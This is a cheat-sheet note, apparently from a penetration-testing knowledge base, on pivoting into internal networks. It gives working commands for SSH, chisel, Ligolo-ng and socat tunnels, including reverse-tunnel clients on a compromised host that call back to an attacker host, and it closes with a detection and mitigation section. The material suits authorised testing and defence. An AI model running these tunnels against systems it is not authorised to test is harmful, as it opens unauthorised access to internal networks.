---
title: Pivoting — SSH, chisel and Ligolo-ng
tags: [pivoting, tunneling, chisel, ligolo, ssh]
---

# Pivoting: reaching the internal network

**English** | [🇪🇸 Español](pivoting.md)

## 1. Pick the tool

| Situation | Tool |
|---|---|
| SSH on the compromised host | `ssh -L/-R/-D` |
| Only HTTP/S egress | `chisel` |
| You need routes and `nmap` as if local | `ligolo-ng` |
| A single port | `socat` |

## 2. SSH

```bash
# local: reach an internal service through the host
ssh -L 8080:127.0.0.1:8080 user@<pivot>
# remote: expose your listener to the internal host
ssh -R 9001:127.0.0.1:9001 user@<pivot>
# dynamic SOCKS
ssh -D 1080 -N -f user@<pivot>
```

With SOCKS, `proxychains4` + `nmap -sT -Pn` (no SYN through the proxy). A `ProxyCommand` in `~/.ssh/config` saves rewriting paths.

## 3. chisel

Server on your machine:

```bash
chisel server -p 8000 --reverse
```

Client on the pivot (uploaded over HTTP or SMB):

```bash
./chisel client <LHOST>:8000 R:socks
./chisel client <LHOST>:8000 R:3306:127.0.0.1:3306
```

`R:socks` opens SOCKS5 on your side at `127.0.0.1:1080`; traffic leaves through the pivot.

## 4. Ligolo-ng

Local proxy:

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
```

Agent on the pivot:

```bash
./agent -connect <LHOST>:11601 -ignore-cert
```

In the proxy console: `session`, `ifconfig` (agent networks), `start`. Add the route:

```bash
sudo ip route add 192.168.2.0/24 dev ligolo
```

Now `nmap -sS 192.168.2.2` works directly, no proxychains.

## 5. socat and one-off redirects

```bash
socat TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:80
```

Useful when you need a single port without a full tunnel. On Windows: `netsh interface portproxy add v4tov4 ...`.

## 6. Typical errors

- **`nmap -sS` sees nothing over SOCKS** → use `-sT`; SYN does not traverse proxychains.
- **chisel connects but no traffic** → the client listens on the pivot's `127.0.0.1`; check `R:` vs `L:` and outbound firewall.
- **Ligolo: `start` without a route** → missing `ip route add`; the kernel has no path otherwise.
- **DNS does not resolve internally** → edit `/etc/hosts` or use the Ligolo proxy's `--dns`.
- **Tunnel drops** → `autossh`/`screen` and agent reconnection; write down state before closing.

## 7. Detection and mitigation

- Restrict egress by default and force a proxy; block TUN/TAP and tunnels on endpoints.
- Alert on persistent connections to one external host and on `chisel`/`ligolo` signatures.
- Segment VLANs and log east-west flows.
- In writeups, document which network was visible from each hop: that is the part people forget.

MITRE: T1572, T1090.003, T1021.004.
